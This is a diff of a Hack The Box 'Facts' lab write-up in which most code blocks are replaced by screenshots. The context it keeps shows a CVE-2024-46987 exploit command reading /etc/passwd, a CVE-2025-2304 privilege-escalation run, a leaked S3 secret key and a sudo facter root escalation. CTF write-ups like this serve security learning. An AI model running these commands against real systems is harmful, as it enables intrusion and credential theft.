@@ -1,5 +1,7 @@
 # HTB Machine: Facts — Full Writeup 🚩
 
+![Image alt](assets/banner.png)
+
 ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
 ![Category](https://img.shields.io/badge/Category-Web%20%7C%20PrivEsc-blue)
 ![OS](https://img.shields.io/badge/OS-Linux-lightgrey)
@@ -51,7 +53,7 @@ PORT     STATE  SERVICE       VERSION
 80/tcp   open   http          nginx 1.26.3 (Ubuntu)
 ```
 
-Only SSH (22) and a web server (80) were open. The focus was clearly on the web application.
+[Only SSH (22) and a web server (80) were open](./assets/nmap.png). The focus was clearly on the web application.
 
 ### Step 2: Web Fuzzing and Finding the Admin Panel
 
@@ -62,7 +64,7 @@ We’re sorry, but something went wrong.
 If you’re the application owner check the logs for more information.
 ```
 
-This was a classic sign of a Ruby on Rails or similar application revealing a 500 error. Thinking I might find a way to view those logs, I ran gobuster to enumerate directories. The server was configured with a wildcard, returning a 200 OK status for non-existent directories, which made fuzzing difficult.
+This was a classic sign of a Ruby on Rails or similar application revealing a 500 error. Thinking I might find a way to view those logs, I ran gobuster to enumerate directories. [The server was configured with a wildcard, returning a 200 OK status for non-existent directories](assets/gobuster.png), which made fuzzing difficult.
 
 ```bash
 gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt -t 50
@@ -99,7 +101,7 @@ I found a public Proof-of-Concept (PoC) for CVE-2024-46987, which allows an auth
 # Download the exploit and run it
 python3 CVE-2024-46987.py -u http://facts.htb -l 12341234 -p 12341234 /etc/passwd
 ```
-
+![Image alt](assets/passwd.png)
 The output confirmed two non-standard users:
 
 ```text
@@ -117,8 +119,6 @@ python3 CVE-2024-46987.py -u http://facts.htb -l 12341234 -p 12341234 /home/will
 ### Step 4: Exploiting CVE-2025-2304 (PrivEsc to Admin)
 
 Having the user flag wasn't enough; I needed a way to move laterally. The second CVE, CVE-2025-2304, was perfect. This vulnerability allows any authenticated user to escalate their privileges to administrator by manipulating the password change request.
-
-I found another PoC and ran it against the target with my low-privilege credentials.
 
 ```bash
 └─$ python3 exploit.py http://facts.htb 12341234 12341234
@@ -142,12 +142,7 @@ Secret Key: ry/bKd9ycFEicrjCMPYupNfU8y+BIR7q+1SL8Ju4
 
 These weren't for the main AWS cloud, but for a private, internal S3 instance likely running on the server itself. I configured the AWS CLI to use these credentials and a custom endpoint URL, which was hinted at in the CMS configuration.
 
-```bash
-aws configure --profile facts
-# Provided the Access Key ID and Secret Key.
-# Region: us-east-1
-# Output format: json
-```
+![Image alt](assets/aws_config.png)
 
 ### Step 6: Dumping the S3 Bucket and Cracking the SSH Key
 
@@ -230,11 +225,11 @@ trivia@facts:~$ sudo /usr/bin/facter pwn --custom-dir /tmp
 
 And just like that, I was root.
 
-```bash
-root@facts:/home/trivia# cd /root
-root@facts:~# cat root.txt
-33*******************0ddb4
-```
+![Image alt](assets/root_flag.png)
+
+---
+
+![Image alt](assets/banner.png)
 
 🏁 Conclusion
 
